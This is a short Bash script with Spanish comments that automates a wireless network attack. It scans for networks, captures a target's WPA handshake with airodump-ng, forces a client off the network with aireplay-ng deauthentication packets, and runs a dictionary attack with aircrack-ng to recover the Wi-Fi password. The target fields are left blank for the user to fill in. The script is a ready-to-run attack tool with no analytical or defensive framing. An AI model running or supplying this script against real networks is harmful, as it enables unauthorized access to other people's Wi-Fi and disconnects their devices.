#!/bin/bash
# instalaciones -> sudo apt install -y aircrack-ng wireless-tools macchanger tcpdump

# Configuración
INTERFACE="wlan0"  # Cambia esto a tu interfaz de red
OUTPUT_DIR="./captures"
TARGET_BSSID=""     # Cambia esto a la dirección MAC de la red objetivo
TARGET_CHANNEL=""   # Cambia esto al canal de la red objetivo
CLIENT_MAC=""       # Cambia esto a la dirección MAC del cliente (opcional)
DICTIONARY_PATH=""  # Ruta al archivo de diccionario (ej. /path/to/dictionary.txt)

# Crear directorio de salida
mkdir -p $OUTPUT_DIR

# Función para capturar handshakes
capture_handshake() {
    echo "Escaneando redes..."
    airodump-ng $INTERFACE --write $OUTPUT_DIR/capture --output-format csv &

    # Esperar un momento para que airodump-ng inicie
    sleep 10

    # Capturar handshake
    echo "Capturando handshake de $TARGET_BSSID en el canal $TARGET_CHANNEL..."
    airodump-ng --bssid $TARGET_BSSID -c $TARGET_CHANNEL -w $OUTPUT_DIR/handshake $INTERFACE
}

# Función para desautenticar clientes
deauth_clients() {
    if [ -n "$CLIENT_MAC" ]; then
        echo "Desautenticando cliente $CLIENT_MAC de $TARGET_BSSID..."
        aireplay-ng --deauth 10 -a $TARGET_BSSID -c $CLIENT_MAC $INTERFACE
    else
        echo "No se ha especificado un cliente para desautenticar."
    fi
}

# Función para descifrar la contraseña
crack_password() {
    echo "Intentando descifrar la contraseña usando el diccionario en $DICTIONARY_PATH..."
    aircrack-ng -w $DICTIONARY_PATH -b $TARGET_BSSID $OUTPUT_DIR/handshake-01.cap
}

# Comenzar el proceso
echo "Iniciando el proceso de captura..."
capture_handshake

# Desautenticar clientes (opcional)
deauth_clients

# Intentar descifrar la contraseña
crack_password

# Finalizar
echo "Proceso completado. Los resultados se guardan en $OUTPUT_DIR."
